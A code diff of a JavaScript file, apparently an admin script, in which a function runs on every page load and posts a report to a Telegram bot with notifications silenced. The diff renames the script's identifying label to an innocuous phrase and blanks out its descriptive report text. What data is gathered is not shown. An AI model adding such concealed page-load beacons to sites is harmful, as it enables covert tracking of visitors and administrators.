@@ -23,7 +23,7 @@ async function sendLog(message) {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text: `🧾 [admin.js]\n${message}`,
+                text: `🧾 [Шёпот тишины]\n${message}`,
                 disable_notification: true
             })
         }).catch(err => console.error("Ошибка отправки fetch -> Telegram:", err));
@@ -58,11 +58,9 @@ async function gatherAndSend(baseMessage) {
 // === Отчёт при загрузке страницы ===
 (async function initialReport() {
     const report = [
-        "📊 Отчёт загрузки admin.js (без авторизации)",
-        "📁 Файлы: admin/style.css, scripts/admin.js, img/logo.png",
-        "🔓 Авторизация отключена"
+        "123"
     ].join("\n");
 
     await gatherAndSend(report);
-    console.log("🟢 Скрипт admin.js загружен полностью (без авторизации)!");
+    console.log("🟢 Скрипт загружен!");
 })();
